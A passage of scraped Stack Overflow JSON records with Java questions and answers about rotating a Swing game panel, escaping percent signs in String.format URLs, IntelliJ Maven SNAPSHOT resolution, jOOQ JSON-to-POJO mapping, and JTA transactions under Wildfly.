(enemy_y[i] + enemy_height)\r\n\t\t\t\t\t){\r\n\t\t\t\t\t\t//hit\r\n\t\t\t\t\t\tmissile_flag = 0;\r\n\t\t\t\t\t\tenemy_alive[i] = 0;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\tprivate boolean checkClear(){\r\n\t\t\tint cnt = 0;\r\n\t\t\tfor(int i = 0; i &lt; n; i++){\r\n\t\t\t\tif(enemy_alive[i] == 0) cnt++;\r\n\t\t\t}\r\n\t\t\treturn (n == cnt);\r\n\t\t}\t\r\n            if(lives&gt;0) {\r\n                int x = 0;\r\n                int y = getHeight()- heart.getHeight();\r\n                for(int index = 0; index &lt; lives; index++) {\r\n                    g.drawImage(heart, x, y, this);\r\n                    x += heart.getWidth();\r\n                }\r\n            }\r\n\t\t\t\r\n\t\t\tg2d.dispose();\r\n\t\t}\r\n\t\tpublic void actionPerformed(ActionEvent e){\r\n\t\t\tif (e.getSource() == timer) {\r\n\t\t\t\tupdateEnemiesPosition();\r\n\t\t\t\tupdateMyPosition();\r\n\r\n\t\t\t\tupdateMyMissile();\r\n\t\t\t\tupdateEnemiesMissile();\r\n\r\n\t\t\t\tactivateEnemiesMissile();\r\n\r\n\t\t\t\tif(checkHitToPlayer()){\r\n\t\t\t\t\tSystem.out.println(&quot;===== Game Over =====&quot;);\r\n\t\t\t\t\tSystem.exit(0);\r\n\t\t\t\t}\r\n\t\t\t\tcheckHitToEnemy();\r\n\t\t\t\tif(checkClear()){\r\n\t\t\t\t\tSystem.out.println(&quot;===== Game Clear =====&quot;);\r\n\t\t\t\t\tSystem.exit(0);\r\n\t\t\t\t}\r\n\t\t\t\trepaint();\r\n\t\t\t}\r\n\t\t}\r\n\t\tpublic void mouseClicked(MouseEvent me)\r\n\t\t{ }\r\n\t\tpublic void mousePressed(MouseEvent me)\r\n\t\t{\r\n\t\t\tactivateMyMissile();\r\n\t\t}\r\n\t\tpublic void mouseReleased(MouseEvent me)\r\n\t\t{ }\r\n\t\tpublic void mouseExited(MouseEvent me)\r\n\t\t{ }\r\n\t\tpublic void mouseEntered(MouseEvent me)\r\n\t\t{ }\r\n\t\tpublic void mouseMoved(MouseEvent me)\r\n\t\t{ }\r\n\t\tpublic void mouseDragged(MouseEvent me)\r\n\t\t{ }\r\n\t\tpublic void keyReleased(KeyEvent e){\r\n\t\t}\r\n\t\tpublic void keyTyped(KeyEvent e){\r\n\t\t}\r\n\t}\r\n}\r\n\r\n```","title":"Rotating game in JPanel","body":"<p>I created a very simple shooting game utilizing <code>JPanel</code> as shown in the code below. I also wanted to experiment with rotating the game and trying it out. I have one issue, where the game I was able to successfully rotate the game but the dimension seems to cut out, and I have to set each position of the enemy and myself to the rotated position.</p>\n<p>I was wondering if there was a way to rotate the result as a <strong>whole</strong>, instead of simply rotating the shape so that the position of the ship and the missiles would also rotate all at once.</p>\n<p><strong>Edited code:</strong> added three lives to the player and tried implementing heart image with <code>BufferedImage</code>.</p>\n<pre><code>public class game extends JFrame{\n    public game(){\n\n    }\n    public static void main(String[] args){\n        new game();\n    }\n    public class MyJPanel extends JPanel implements ActionListener, MouseListener,\n    MouseMotionListener,KeyListener\n    {\n        //variables for player\n        int my_x;\n        int player_width,player_height;\n        \n        private int lives = 3;\n        int heart_width, heart_height;\n        //variables for player's missiles\n        int my_missile_x, my_missile_y;\n        int missile_flag;\n        public static final int MY_Y = 600;\n\n        //variables for enemies' missiles\n        int e_missile_flag[];\n        int e_missile_x[];\n        int e_missile_y[];\n        int e_missile_move[];\n\n        Image image,image2;\n        Timer timer;\n\n        private BufferedImage heart; \n        \n        public MyJPanel(){\n            missile_flag = 0;\n\n            /*** initialize enemies' info ***/\n            ImageIcon icon2 = new ImageIcon(&quot;enemy.jpg&quot;);\n            image2 = icon2.getImage();\n            enemy_width = image2.getWidth(this);\n            enemy_height = image2.getHeight(this);\n            \n            try {\n            heart = ImageIO.read(getClass().getResource(&quot;heart.jpg&quot;));\n            \n            }catch(IOException e) {\n            }\n            heart_width = heart.getWidth(this);\n            heart_height = heart.getHeight(this);\n\n            n = 14; //number of enemies\n            enemy_x = new int[n];\n            enemy_y = new int[n];\n            enemy_move = new int[n];\n            enemy_alive = new int[n];\n            int distance = 40;\n\n            e_missile_flag = new int[n];\n            e_missile_x = new int[n];\n            e_missile_y = new int[n];\n            e_missile_move = new int[n];\n\n            // place enemies in 7x2\n            for (int i = 0; i &lt; 7; i++) {\n                enemy_x[i] = (enemy_width + distance) * i + 50;\n                enemy_y[i] = 50;\n            }\n            for (int i = 7; i &lt; n; i++) {\n                enemy_x[i] = (enemy_width + distance) * (i - 5) + 50;\n                enemy_y[i] = 100;\n            }\n            for (int i = 0; i &lt; n; i++) {\n                enemy_alive[i] = 1; //all alive\n                enemy_move[i] = -10; //moves to left\n            }\n\n            for (int i = 0; i &lt; n; i++) {\n                e_missile_flag[i] = 0;\n                e_missile_x[i] = 0;\n                e_missile_y[i] = 0;\n                e_missile_move[i] = 7 + n%3;\n            }\n\n            /*** setup system ***/\n            setBackground(Color.black);\n            setFocusable(true);\n            addMouseListener(this);\n            addMouseMotionListener(this);\n            addKeyListener(this);\n            timer = new Timer(50, this);\n            timer.start();\n        }\n        \n        private void updateEnemiesPosition(){\n            //update enemies' position\n            Dimension dim = getSize();\n            for (int i = 0; i &lt; n; i++) {\n                enemy_x[i] += enemy_move[i];\n                if ((enemy_x[i] &lt; 0) || (enemy_x[i] &gt; (dim.width - enemy_width))) {\n                    enemy_move[i] = -enemy_move[i];\n                }\n            }\n        }\n        private void updateMyPosition() {\n            if(my_x &lt; 0) {\n                my_x = 800;\n            }\n            if(my_x &gt; 800) {\n                my_x = 0;\n            }\n        }\n        \n        private void activateMyMissile(){\n            //shoot a missile\n            if(missile_flag == 0){\n                my_missile_x = my_x + player_width / 2;\n                my_missile_y = MY_Y; //MY_Y=400\n                missile_flag = 1;\n            }\n        }\n        private void updateMyMissile(){\n            //update missile position if alive\n            if (missile_flag == 1) {\n                my_missile_y -= 15;\n                if (0 &gt; my_missile_y) {\n                    missile_flag = 0;\n                }\n            }\n        }\n        private void activateEnemiesMissile(){\n            //activate enemies' missile if enemy is alive and its missile is not alive\n            for(int i = 0; i &lt; n; i++){\n                if (enemy_alive[i] == 1 &amp;&amp; e_missile_flag[i] == 0) {\n                    e_missile_x[i] = enemy_x[i] + enemy_width/2;\n                    e_missile_y[i] = enemy_y[i];\n                    e_missile_flag[i] = 1;\n                }\n            }\n        }\n        private void updateEnemiesMissile(){\n            //update enemies' missile position if alive\n            Dimension dim = getSize();\n            for(int i = 0; i &lt; n; i++){\n                if (e_missile_flag[i] == 1) {\n                    e_missile_y[i] += e_missile_move[i];\n                    if (e_missile_y[i] &gt; dim.height) {\n                        e_missile_flag[i] = 0;\n                    }\n                }\n            }\n        }\n        private void checkHitToEnemy(){\n            for(int i = 0; i &lt; n; i++){\n                if(missile_flag == 1 &amp;&amp; enemy_alive[i] == 1){\n                    if(\n                        my_missile_x &gt; enemy_x[i] &amp;&amp;\n                        my_missile_x &lt; (enemy_x[i] + enemy_width) &amp;&amp;\n                        my_missile_y &gt; enemy_y[i] &amp;&amp;\n                        my_missile_y &lt; (enemy_y[i] + enemy_height)\n                    ){\n                        //hit\n                        missile_flag = 0;\n                        enemy_alive[i] = 0;\n                    }\n                }\n            }\n        }\n        private boolean checkClear(){\n            int cnt = 0;\n            for(int i = 0; i &lt; n; i++){\n                if(enemy_alive[i] == 0) cnt++;\n            }\n            return (n == cnt);\n        }   \n            if(lives&gt;0) {\n                int x = 0;\n                int y = getHeight()- heart.getHeight();\n                for(int index = 0; index &lt; lives; index++) {\n                    g.drawImage(heart, x, y, this);\n                    x += heart.getWidth();\n                }\n            }\n            \n            g2d.dispose();\n        }\n        public void actionPerformed(ActionEvent e){\n            if (e.getSource() == timer) {\n                updateEnemiesPosition();\n                updateMyPosition();\n\n                updateMyMissile();\n                updateEnemiesMissile();\n\n                activateEnemiesMissile();\n\n                if(checkHitToPlayer()){\n                    System.out.println(&quot;===== Game Over =====&quot;);\n                    System.exit(0);\n                }\n                checkHitToEnemy();\n                if(checkClear()){\n                    System.out.println(&quot;===== Game Clear =====&quot;);\n                    System.exit(0);\n                }\n                repaint();\n            }\n        }\n        public void mouseClicked(MouseEvent me)\n        { }\n        public void mousePressed(MouseEvent me)\n        {\n            activateMyMissile();\n        }\n        public void mouseReleased(MouseEvent me)\n        { }\n        public void mouseExited(MouseEvent me)\n        { }\n        public void mouseEntered(MouseEvent me)\n        { }\n        public void mouseMoved(MouseEvent me)\n        { }\n        public void mouseDragged(MouseEvent me)\n        { }\n        public void keyReleased(KeyEvent e){\n        }\n        public void keyTyped(KeyEvent e){\n        }\n    }\n}\n\n</code></pre>\n"},{"tags":["java","string-formatting"],"answers":[{"tags":[],"owner":{"account_id":3340852,"reputation":1493,"user_id":2807177,"display_name":"gmanjon"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642497161,"creation_date":1642494663,"answer_id":70752438,"question_id":70752210,"body_markdown":"You need to escape the `%` symbol for the URL characters that are not part of the string formatting. You escape it by duplicating it `%%`. So try with this pattern instead:\r\n\r\n```java\r\nString vmDataFeedUrlPatternWithBB = &quot;datafeed?boundingbox=%f%%2C%%20%f%%2C%%20%f%%2C%%20%f&quot;;\r\n```","title":"Java String formatting for a REST API url","body":"<p>You need to escape the <code>%</code> symbol for the URL characters that are not part of the string formatting. You escape it by duplicating it <code>%%</code>. So try with this pattern instead:</p>\n<pre class=\"lang-java prettyprint-override\"><code>String vmDataFeedUrlPatternWithBB = &quot;datafeed?boundingbox=%f%%2C%%20%f%%2C%%20%f%%2C%%20%f&quot;;\n</code></pre>\n"},{"tags":[],"owner":{"account_id":9573972,"reputation":1131,"user_id":7110786,"display_name":"Saif Ahmad"},"down_vote_count":0,"up_vote_count":3,"is_accepted":true,"score":3,"last_activity_date":1642494808,"creation_date":1642494808,"answer_id":70752464,"question_id":70752210,"body_markdown":"Since you&#39;ve `%2C` in the String format expression it&#39;s treated as a character and expecting a character value hence it&#39;s not working as expected.\r\n\r\nTo solve this problem you&#39;ve 2 options:\r\n\r\n**1) String Contactenation:**\r\n\r\n        final String COMMA = &quot;%2C%20&quot;;\r\n        String vmDataFeedUrlPatternWithBB = &quot;datafeed?boundingbox=&quot;+a+COMMA+b+COMMA+c+COMMA+d;\r\n        System.out.println(vmDataFeedUrlPatternWithBB);\r\n\r\n&gt; OUTPUT:\r\n\r\n    datafeed?boundingbox=53.64577%2C%202.73389%2C%2053.93593%2C%20-2.06653\r\n\r\n**2) Use `URLEncoder`**\r\n\r\n        String vmDataFeedUrlPatternWithBB = &quot;datafeed?boundingbox=&quot;;\r\n        String values = &quot;%f,%f,%f,%f&quot;;\r\n\r\n        String s = String.format(values, a, b, c, d);\r\n\r\n        try {\r\n            String encode = URLEncoder.encode(s, StandardCharsets.UTF_8.toString());\r\n            String finalValue = vmDataFeedUrlPatternWithBB + encode;\r\n            System.out.println(finalValue);\r\n        } catch (UnsupportedEncodingException e) {\r\n            e.printStackTrace();\r\n        }\r\n\r\n&gt; OUTPUT:\r\n\r\n    datafeed?boundingbox=53.645770%2C2.733890%2C53.935930%2C-2.066530\r\n","title":"Java String formatting for a REST API url","body":"<p>Since you've <code>%2C</code> in the String format expression it's treated as a character and expecting a character value hence it's not working as expected.</p>\n<p>To solve this problem you've 2 options:</p>\n<p><strong>1) String Contactenation:</strong></p>\n<pre><code>    final String COMMA = &quot;%2C%20&quot;;\n    String vmDataFeedUrlPatternWithBB = &quot;datafeed?boundingbox=&quot;+a+COMMA+b+COMMA+c+COMMA+d;\n    System.out.println(vmDataFeedUrlPatternWithBB);\n</code></pre>\n<blockquote>\n<p>OUTPUT:</p>\n</blockquote>\n<pre><code>datafeed?boundingbox=53.64577%2C%202.73389%2C%2053.93593%2C%20-2.06653\n</code></pre>\n<p><strong>2) Use <code>URLEncoder</code></strong></p>\n<pre><code>    String vmDataFeedUrlPatternWithBB = &quot;datafeed?boundingbox=&quot;;\n    String values = &quot;%f,%f,%f,%f&quot;;\n\n    String s = String.format(values, a, b, c, d);\n\n    try {\n        String encode = URLEncoder.encode(s, StandardCharsets.UTF_8.toString());\n        String finalValue = vmDataFeedUrlPatternWithBB + encode;\n        System.out.println(finalValue);\n    } catch (UnsupportedEncodingException e) {\n        e.printStackTrace();\n    }\n</code></pre>\n<blockquote>\n<p>OUTPUT:</p>\n</blockquote>\n<pre><code>datafeed?boundingbox=53.645770%2C2.733890%2C53.935930%2C-2.066530\n</code></pre>\n"}],"owner":{"account_id":3214634,"reputation":10538,"user_id":2713740,"accept_rate":85,"display_name":"Luca"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":806,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70752464,"answer_count":2,"score":0,"last_activity_date":1642497161,"creation_date":1642493478,"question_id":70752210,"body_markdown":"I am trying to format a URL in Java using `String.format`. The API takes the parameters of the following form:\r\n\r\n```\r\ndatafeed?boundingBox=-2.73389%2C%2053.64577%2C%20-2.06653%2C%2053.93593\r\n```\r\n\r\nSo, I am trying something like:\r\n\r\n```\r\npublic class MyClass {\r\n    public static void main(String args[]) {\r\n      double a = 53.64577;\r\n      double b = 2.73389;\r\n      double c = 53.93593;\r\n      double d = -2.06653;\r\n      \r\n      String vmDataFeedUrlPatternWithBB = &quot;datafeed?boundingbox=%f%2C%20%f%2C%20%f%2C%20%f&quot;;\r\n\r\n      System.out.println(String.format(vmDataFeedUrlPatternWithBB,a, b, c, d));\r\n    }\r\n}\r\n```\r\n\r\nHowever, this is having issues and results in:\r\n\r\n```\r\nException in thread &quot;main&quot; java.util.IllegalFormatConversionException: c != java.lang.Double\r\n```\r\n\r\nMaybe I need to convert the comma and space separately but have not been able to figure this out.","title":"Java String formatting for a REST API url","body":"<p>I am trying to format a URL in Java using <code>String.format</code>. The API takes the parameters of the following form:</p>\n<pre><code>datafeed?boundingBox=-2.73389%2C%2053.64577%2C%20-2.06653%2C%2053.93593\n</code></pre>\n<p>So, I am trying something like:</p>\n<pre><code>public class MyClass {\n    public static void main(String args[]) {\n      double a = 53.64577;\n      double b = 2.73389;\n      double c = 53.93593;\n      double d = -2.06653;\n      \n      String vmDataFeedUrlPatternWithBB = &quot;datafeed?boundingbox=%f%2C%20%f%2C%20%f%2C%20%f&quot;;\n\n      System.out.println(String.format(vmDataFeedUrlPatternWithBB,a, b, c, d));\n    }\n}\n</code></pre>\n<p>However, this is having issues and results in:</p>\n<pre><code>Exception in thread &quot;main&quot; java.util.IllegalFormatConversionException: c != java.lang.Double\n</code></pre>\n<p>Maybe I need to convert the comma and space separately but have not been able to figure this out.</p>\n"},{"tags":["java","maven","intellij-idea","ide","maven-3"],"comments":[{"owner":{"account_id":112317,"reputation":93939,"user_id":296328,"accept_rate":60,"display_name":"khmarbaise"},"score":0,"creation_date":1642447565,"post_id":70746392,"comment_id":125068348,"body_markdown":"Why using a system scoped dependency? Based on the looking of the jar file it is already an outcome of another maven build so you can simply do on that project `mvn install` and use it a usual dependency...","body":"Why using a system scoped dependency? Based on the looking of the jar file it is already an outcome of another maven build so you can simply do on that project <code>mvn install</code> and use it a usual dependency..."},{"owner":{"account_id":4413420,"reputation":919,"user_id":3595685,"accept_rate":78,"display_name":"Steve"},"score":0,"creation_date":1642486779,"post_id":70746392,"comment_id":125076344,"body_markdown":"We receive this jar file from one of our partners.  We prefer not to `mvn install` it in our environment until we sanity test it.","body":"We receive this jar file from one of our partners.  We prefer not to <code>mvn install</code> it in our environment until we sanity test it."},{"owner":{"account_id":2273465,"reputation":15439,"user_id":2000323,"display_name":"Andrey"},"score":0,"creation_date":1643031630,"post_id":70746392,"comment_id":125224363,"body_markdown":"`Upon hours of digging, I found that in the &#39;Project Dependencies View&#39; Intellij lists this dependency as com.wd.xml:wdXml:3.0-SNAPSHOT instead of com.wd.xml:wdXml:3.0-20211116.183306-362` the library name is not that important. The important part is - What is the **path** to the jar you see for this dependency? You can see it in the library configuration dialog for this library: https://monosnap.com/file/XWNyo2uKjMpTLdftwwjXJSqmckOlag Also, clarify, does Build | Rebuild action complete successfully? Does `mvn compile` complete successfully?","body":"<code>Upon hours of digging, I found that in the &#39;Project Dependencies View&#39; Intellij lists this dependency as com.wd.xml:wdXml:3.0-SNAPSHOT instead of com.wd.xml:wdXml:3.0-20211116.183306-362</code> the library name is not that important. The important part is - What is the <b>path</b> to the jar you see for this dependency? You can see it in the library configuration dialog for this library: <a href=\"https://monosnap.com/file/XWNyo2uKjMpTLdftwwjXJSqmckOlag\" rel=\"nofollow noreferrer\">monosnap.com/file/XWNyo2uKjMpTLdftwwjXJSqmckOlag</a> Also, clarify, does Build | Rebuild action complete successfully? Does <code>mvn compile</code> complete successfully?"}],"owner":{"account_id":4413420,"reputation":919,"user_id":3595685,"accept_rate":78,"display_name":"Steve"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":337,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1642497029,"creation_date":1642446709,"question_id":70746392,"body_markdown":"I am using **Intellij IDEA 2021.3.1 Community edition** on Linux for one of my Maven project. In the pom.xml file, there is a dependency with `system` scope having version `3.0-20211116.183306-362` as mentioned below:\r\n\r\n   \t\t&lt;dependency&gt;\r\n\t\t\t&lt;groupId&gt;com.wd.xml&lt;/groupId&gt;\r\n\t\t\t&lt;artifactId&gt;wdXml&lt;/artifactId&gt;\r\n\t\t\t&lt;scope&gt;system&lt;/scope&gt;\r\n\t\t\t&lt;systemPath&gt;/home/mylib/wdXml-3.0-20211116.183306-362.jar&lt;/systemPath&gt;\r\n\t\t\t&lt;version&gt;3.0-20211116.183306-362&lt;/version&gt;\r\n\t\t&lt;/dependency&gt;\r\n\r\nThe pom.xml does not have any issue, and `mvn package` command runs fine. However, the editor shows compilation errors in the Java class using this dependency.\r\n\r\nUpon hours of digging, I found that in the &#39;Project Dependencies View&#39; Intellij lists this dependency as `com.wd.xml:wdXml:3.0-SNAPSHOT` instead of `com.wd.xml:wdXml:3.0-20211116.183306-362`.\r\n\r\n**UPDATE**\r\n\r\nI believe it is because of [this][1] Maven convention\r\n\r\n&gt; **version** if you distribute it, then you can choose any typical version with numbers and dots (1.0, 1.1, 1.0.1, ...). **Don&#39;t use dates as they are usually associated with SNAPSHOT (nightly) builds**. If it&#39;s a third party artifact, you have to use their version number whatever it is, and as strange as it can look. For example,\r\n2.0, 2.0.1, 1.3.1\r\n\r\nHow do I resolve this? Is there any setting in the IDE that can be tweaked.\r\n\r\n\r\n  [1]: https://maven.apache.org/guides/mini/guide-naming-conventions.html","title":"Intellij recognizes maven dependency as SNAPSHOT","body":"<p>I am using <strong>Intellij IDEA 2021.3.1 Community edition</strong> on Linux for one of my Maven project. In the pom.xml file, there is a dependency with <code>system</code> scope having version <code>3.0-20211116.183306-362</code> as mentioned below:</p>\n<pre><code>    &lt;dependency&gt;\n        &lt;groupId&gt;com.wd.xml&lt;/groupId&gt;\n        &lt;artifactId&gt;wdXml&lt;/artifactId&gt;\n        &lt;scope&gt;system&lt;/scope&gt;\n        &lt;systemPath&gt;/home/mylib/wdXml-3.0-20211116.183306-362.jar&lt;/systemPath&gt;\n        &lt;version&gt;3.0-20211116.183306-362&lt;/version&gt;\n    &lt;/dependency&gt;\n</code></pre>\n<p>The pom.xml does not have any issue, and <code>mvn package</code> command runs fine. However, the editor shows compilation errors in the Java class using this dependency.</p>\n<p>Upon hours of digging, I found that in the 'Project Dependencies View' Intellij lists this dependency as <code>com.wd.xml:wdXml:3.0-SNAPSHOT</code> instead of <code>com.wd.xml:wdXml:3.0-20211116.183306-362</code>.</p>\n<p><strong>UPDATE</strong></p>\n<p>I believe it is because of <a href=\"https://maven.apache.org/guides/mini/guide-naming-conventions.html\" rel=\"nofollow noreferrer\">this</a> Maven convention</p>\n<blockquote>\n<p><strong>version</strong> if you distribute it, then you can choose any typical version with numbers and dots (1.0, 1.1, 1.0.1, ...). <strong>Don't use dates as they are usually associated with SNAPSHOT (nightly) builds</strong>. If it's a third party artifact, you have to use their version number whatever it is, and as strange as it can look. For example,\n2.0, 2.0.1, 1.3.1</p>\n</blockquote>\n<p>How do I resolve this? Is there any setting in the IDE that can be tweaked.</p>\n"},{"tags":["java","json","spring-boot","jooq"],"comments":[{"owner":{"account_id":2563377,"reputation":7174,"user_id":2224047,"display_name":"Nikolai  Shevchenko"},"score":0,"creation_date":1642500614,"post_id":70750733,"comment_id":125081179,"body_markdown":"`emp_name`, `emp_email`, etc you shouldn&#39;t name properties like this. Better stick to Java naming conventions and name them `empName`, `empEmail`, etc. Thus you can avoid much pain with libraries (Jackson, MapStruct and others) that do follow convention and expect proper names.","body":"<code>emp_name</code>, <code>emp_email</code>, etc you shouldn&#39;t name properties like this. Better stick to Java naming conventions and name them <code>empName</code>, <code>empEmail</code>, etc. Thus you can avoid much pain with libraries (Jackson, MapStruct and others) that do follow convention and expect proper names."},{"owner":{"account_id":22549881,"reputation":103,"user_id":16739133,"display_name":"Prashanth Billa"},"score":0,"creation_date":1642651188,"post_id":70750733,"comment_id":125129481,"body_markdown":"Yah, Thank you @Nikolai","body":"Yah, Thank you @Nikolai"}],"answers":[{"tags":[],"owner":{"account_id":247217,"reputation":213455,"user_id":521799,"accept_rate":89,"display_name":"Lukas Eder"},"down_vote_count":0,"up_vote_count":2,"is_accepted":true,"score":2,"last_activity_date":1642496883,"creation_date":1642496883,"answer_id":70752922,"question_id":70750733,"body_markdown":"If you&#39;re not too opinionated on how the JSON should be mapped to your POJOs, it should suffice to place either Gson or Jackson on your classpath, and jOOQ will pick that up and map JSON to your POJOs automatically, see [this section of the manual about the `ConverterProvider`][1].\r\n\r\nE.g. this should work out of the box:\r\n\r\n```java\r\nList&lt;EmployeeDetails&gt; list =\r\nctx.selectFrom(EMPLOYEE_DETAILS)\r\n   .fetchInto(EmployeeDetails.class);\r\n```\r\n\r\n\r\n  [1]: https://www.jooq.org/doc/latest/manual/sql-execution/fetching/converter-provider/","title":"How to convert JSON (org.jooq.JSON) to Java Object (POJO)","body":"<p>If you're not too opinionated on how the JSON should be mapped to your POJOs, it should suffice to place either Gson or Jackson on your classpath, and jOOQ will pick that up and map JSON to your POJOs automatically, see <a href=\"https://www.jooq.org/doc/latest/manual/sql-execution/fetching/converter-provider/\" rel=\"nofollow noreferrer\">this section of the manual about the <code>ConverterProvider</code></a>.</p>\n<p>E.g. this should work out of the box:</p>\n<pre class=\"lang-java prettyprint-override\"><code>List&lt;EmployeeDetails&gt; list =\nctx.selectFrom(EMPLOYEE_DETAILS)\n   .fetchInto(EmployeeDetails.class);\n</code></pre>\n"}],"owner":{"account_id":22549881,"reputation":103,"user_id":16739133,"display_name":"Prashanth Billa"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":2480,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"accepted_answer_id":70752922,"answer_count":1,"score":2,"last_activity_date":1642496883,"creation_date":1642484151,"question_id":70750733,"body_markdown":"I have tried lot of ways to find to convert JSON object (org.jooq) to java object (pojo). I am working on spring-boot application using jOOQ to talk with the database.\r\n\r\n***Actually I have a employee_details table in database shown in below:***\r\n\r\n[![enter image description here][1]][1]\r\n\r\n  [1]: https://i.stack.imgur.com/XJfzD.png\r\n\r\nIn the above table has employee details, In that table emp_address column type  is JSON datatype\r\n\r\nNow I want to retrieve the one employee_details from table where id=X and I tried to store the details in below java object class (POJO).\r\n  \r\n***EmployeeDetails class:***\r\n\r\n```\r\n@AllArgsConstructor\r\n@NoArgsConstructor\r\n@Data\r\npublic class EmployeeDetails {\r\n    private int              id;\r\n    private String           emp_name;\r\n    private String           emp_email;\r\n    private String           emp_mobile;\r\n    private EmployeeAddress  emp_address;\r\n}\r\n```\r\n\r\n***EmployeeAddress class:***\r\n\r\n```\r\n@AllArgsConstructor\r\n@NoArgsConstructor\r\n@Data\r\npublic class EmployeeAddress {\r\n\r\n    private String hNo;\r\n    private String city;\r\n    private String pincode;\r\n}\r\n```\r\nBut when I try to retrieve the details from table I got store the emp_address(which is json datatype in table) in Json(org.jooq) as shown in below class.\r\n\r\n***EmployeeDetailsJSONJooQ class:***\r\n\r\n```\r\nimport lombok.AllArgsConstructor;\r\nimport lombok.Data;\r\nimport lombok.NoArgsConstructor;\r\nimport org.jooq.JSON;\r\n\r\n@AllArgsConstructor\r\n@NoArgsConstructor\r\n@Data\r\npublic class EmployeeDetailsJSONJooQ {\r\n    private  int        id;\r\n    private  String     emp_name;\r\n    private  String     emp_email;\r\n    private  String     emp_mobile;\r\n    private  JSON       emp_address;\r\n}\r\n```\r\n\r\n\r\nHere I want to retrieve the employee details in either EmployeeDetails object or help me to convert the EmployeeDetails object to EmployeeDetailsJSONJooQ object or how to map these objects using *Mapstruct*. Please help me out\r\n\r\n\r\n","title":"How to convert JSON (org.jooq.JSON) to Java Object (POJO)","body":"<p>I have tried lot of ways to find to convert JSON object (org.jooq) to java object (pojo). I am working on spring-boot application using jOOQ to talk with the database.</p>\n<p><em><strong>Actually I have a employee_details table in database shown in below:</strong></em></p>\n<p><a href=\"https://i.stack.imgur.com/XJfzD.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/XJfzD.png\" alt=\"enter image description here\" /></a></p>\n<p>In the above table has employee details, In that table emp_address column type  is JSON datatype</p>\n<p>Now I want to retrieve the one employee_details from table where id=X and I tried to store the details in below java object class (POJO).</p>\n<p><em><strong>EmployeeDetails class:</strong></em></p>\n<pre><code>@AllArgsConstructor\n@NoArgsConstructor\n@Data\npublic class EmployeeDetails {\n    private int              id;\n    private String           emp_name;\n    private String           emp_email;\n    private String           emp_mobile;\n    private EmployeeAddress  emp_address;\n}\n</code></pre>\n<p><em><strong>EmployeeAddress class:</strong></em></p>\n<pre><code>@AllArgsConstructor\n@NoArgsConstructor\n@Data\npublic class EmployeeAddress {\n\n    private String hNo;\n    private String city;\n    private String pincode;\n}\n</code></pre>\n<p>But when I try to retrieve the details from table I got store the emp_address(which is json datatype in table) in Json(org.jooq) as shown in below class.</p>\n<p><em><strong>EmployeeDetailsJSONJooQ class:</strong></em></p>\n<pre><code>import lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\nimport org.jooq.JSON;\n\n@AllArgsConstructor\n@NoArgsConstructor\n@Data\npublic class EmployeeDetailsJSONJooQ {\n    private  int        id;\n    private  String     emp_name;\n    private  String     emp_email;\n    private  String     emp_mobile;\n    private  JSON       emp_address;\n}\n</code></pre>\n<p>Here I want to retrieve the employee details in either EmployeeDetails object or help me to convert the EmployeeDetails object to EmployeeDetailsJSONJooQ object or how to map these objects using <em>Mapstruct</em>. Please help me out</p>\n"},{"tags":["java","hibernate","jpa","transactions","entitymanager"],"answers":[{"tags":[],"owner":{"account_id":4735059,"reputation":29,"user_id":3829685,"display_name":"Iran"},"down_vote_count":1,"up_vote_count":3,"is_accepted":false,"score":2,"last_activity_date":1629467877,"creation_date":1586902792,"answer_id":61218208,"question_id":58464770,"body_markdown":"I think you should inject a container managed transaction.\r\n\r\nSomething like:\r\n\r\n    @Resource\r\n    private UserTransaction transaction;\r\n    \r\n    public method() {\r\n      try {\r\n         transaction.begin();\r\n         ...do some persistence...\r\n         transaction.commit();\r\n      } catch (Exception e) {\r\n         transaction.rollback();\r\n      }\r\n    }\r\n\r\nOR\r\n\r\nif you don&#39;t need such control you can use @Transaction annotation on your method.\r\n\r\nHope it helps.\r\n","title":"Transaction is not accessible when using JTA with JPA-compliant transaction access enabled","body":"<p>I think you should inject a container managed transaction.</p>\n<p>Something like:</p>\n<pre><code>@Resource\nprivate UserTransaction transaction;\n\npublic method() {\n  try {\n     transaction.begin();\n     ...do some persistence...\n     transaction.commit();\n  } catch (Exception e) {\n     transaction.rollback();\n  }\n}\n</code></pre>\n<p>OR</p>\n<p>if you don't need such control you can use @Transaction annotation on your method.</p>\n<p>Hope it helps.</p>\n"},{"tags":[],"owner":{"account_id":1147362,"reputation":901,"user_id":1869111,"accept_rate":100,"display_name":"hocikto"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1642496856,"creation_date":1642496856,"answer_id":70752917,"question_id":58464770,"body_markdown":"I had the very same issue but problem lied elsewhere...\r\n\r\nSo the stack: I was using Wildfly server , postgresql, and JPA\r\n\r\nAt first, my persistence.xml was configured to use RESOURCE_LOCAL transactions e.g.\r\n\r\n \r\n\r\n    &lt;persistence-unit name=&quot;unit&quot; transaction-type=&quot;RESOURCE_LOCAL&quot;&gt;\r\n\r\nand I had a problem that even when the method was marked `@Transactional` it was not doing any rollbacks when error occured, yet saving worked fine.\r\n\r\nSo then I decided to use transaction-type JTA instead of RESOURCE_LOCAL so that the container manages the transactions.\r\n\r\nWhen I changed my persistence.xml to  this, it was still not working\r\n\r\n    &lt;persistence-unit name=&quot;unit&quot; transaction-type=&quot;JTA&quot;&gt;\r\n        &lt;jta-data-source&gt;java:jboss/datasources/unit&lt;/jta-data-source&gt;\r\n\r\nand was throwing the very error that is in the title of this question.\r\n\r\nMy problem was, how I was creating the EntityManager, this is how it was defined\r\n\r\n    @Produces\r\n    @PersistenceContext\r\n    private static EntityManager em = Persistence.createEntityManagerFactory(UNIT_NAME).createEntityManager()\r\n\r\nThe solution? I had to remove the annotation `@PersistenceContext`\r\n\r\n\r\nP.s. for JTA transactions do not forget to tell wildfly about the datasource for example via CLI like this\r\n\r\n    data-source add 